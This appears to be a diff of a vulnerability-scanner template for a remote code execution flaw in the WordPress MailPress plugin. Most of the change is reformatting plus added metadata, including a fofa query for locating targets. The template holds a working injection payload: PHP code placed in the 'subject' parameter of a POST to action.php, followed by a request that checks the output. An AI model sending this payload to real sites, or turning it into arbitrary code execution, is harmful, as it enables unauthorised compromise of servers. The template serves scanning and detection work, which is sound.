@@ -1,29 +1,35 @@
 id: wordpress-ext-mailpress-rce
 
 info:
-    name: Wordpress Ext Mailpress RCE
-    author: violin
-    severity: high
+  name: Wordpress Ext Mailpress RCE
+  author: violin
+  severity: high
+  verified: false
+  description: |
+    Wordpress Ext Mailpress 存在远程命令执行漏洞，攻击者可以通过构造特殊的请求参数，在服务器上执行任意命令。
+    fofa: app="Wordpress"
+  tags: wordpress,ext,mailpress,rce
+  created: 2025/03/13
 
 set:
-    r: randomInt(800000000, 1000000000)
-    r1: randomInt(800000000, 1000000000)
+  r: randomInt(800000000, 1000000000)
+  r1: randomInt(800000000, 1000000000)
 rules:
-    r0:
-        request:
-            method: POST
-            path: /wp-content/plugins/mailpress/mp-includes/action.php
-            headers:
-                Content-Type: application/x-www-form-urlencoded
-            body: |
-                action=autosave&id=0&revision=-1&toemail=&toname=&fromemail=&fromname=&to_list=1&Theme=&subject=<?php echo {{r}}%2b{{r1}};?>&html=&plaintext=&mail_format=standard&autosave=1
-        expression: "true"
-        output:
-            search: '"<autosave id=''(?P<id>.+?)''".bsubmatch(response.body)'
-            id: search["id"]
-    r1:
-        request:
-            method: GET
-            path: /wp-content/plugins/mailpress/mp-includes/action.php?action=iview&id={{id}}
-        expression: response.status == 200 && response.body.bcontains(bytes(string(r + r1)))
+  r0:
+    request:
+      method: POST
+      path: /wp-content/plugins/mailpress/mp-includes/action.php
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: |
+        action=autosave&id=0&revision=-1&toemail=&toname=&fromemail=&fromname=&to_list=1&Theme=&subject=<?php echo {{r}}%2b{{r1}};?>&html=&plaintext=&mail_format=standard&autosave=1
+    expression: "true"
+    output:
+      search: '"<autosave id=''(?P<id>.+?)''".bsubmatch(response.body)'
+      id: search["id"]
+  r1:
+    request:
+      method: GET
+      path: /wp-content/plugins/mailpress/mp-includes/action.php?action=iview&id={{id}}
+    expression: response.status == 200 && response.body.bcontains(bytes(string(r + r1)))
 expression: r0() && r1()
